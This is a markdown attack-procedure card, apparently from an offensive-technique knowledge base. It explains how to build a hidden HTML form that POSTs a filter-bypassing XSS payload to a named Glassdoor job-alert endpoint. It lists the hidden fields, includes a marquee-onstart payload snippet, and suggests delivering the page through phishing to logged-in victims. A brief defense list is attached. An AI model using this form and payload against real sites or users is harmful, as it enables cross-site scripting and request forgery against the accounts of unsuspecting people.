---
id: proc-uuid-3
tags:
  - xss
  - payload-delivery
  - html-form
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:33.925Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Construct Malicious HTML Form for POST Delivery

## Summary

This procedure creates a self-contained HTML form that submits the XSS payload via POST to the vulnerable Glassdoor endpoint, including all necessary parameters to mimic a legitimate job alert edit request.

## Description

To deliver the payload realistically, construct an HTML page with hidden inputs for required fields like jobAlertId, keywords, and others, setting locationId to the crafted payload. The form targets https://www.glassdoor.com/profile/editJobAlert.htm. This allows hosting the page or sending via phishing to trick victims into loading it while logged in.

## Requirements

1. Crafted XSS payload from previous step
2. Knowledge of endpoint parameters (e.g., from Burp or DevTools)
3. Text editor for HTML creation

## Defense

Defensive measures and detection strategies:

- Validate all POST parameters server-side for expected formats (e.g., locationId as numeric)
- Implement CSRF tokens in forms to prevent unauthorized submissions
- Scan for and block requests from external HTML forms

## Objectives

1. Ensure form submission reaches the vulnerable endpoint
2. Include all required fields to avoid rejection
3. Prepare for automated or user-triggered submission

## Instructions

### Step 1: Define Form Structure

**Context**: Set up the basic HTML form with action and method.

Create <form method="POST" action="https://www.glassdoor.com/profile/editJobAlert.htm">

### Step 2: Add Hidden Inputs

**Context**: Populate required parameters to simulate valid request.

Include <input type="hidden" name="jobAlertId" value="123">, <input type="hidden" name="keywords" value="">, <input type="hidden" name="rawLocationName" value="Cairo">, <input type="hidden" name="locationType" value="C">, <input type="hidden" name="emailFrequency" value="WEEKLY">, and <input type="hidden" name="locationId" value="payload-here">

```html
<form method="POST" action="https://www.glassdoor.com/profile/editJobAlert.htm">
  <input type="hidden" name="locationId" value="><marquee onstart=\"[cookie].find(confirm)\">">
  <!-- Other hidden inputs -->
</form>
```

> Replace payload-here with the full bypassing string; ensure escaping for HTML.

### Step 3: Save and Test

**Context**: Verify the form structure locally.

Save as .html and open in browser to check submission without errors.

**Expected Output**: Form ready for integration with automation script.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[form-injection]]
- [[post-request]]
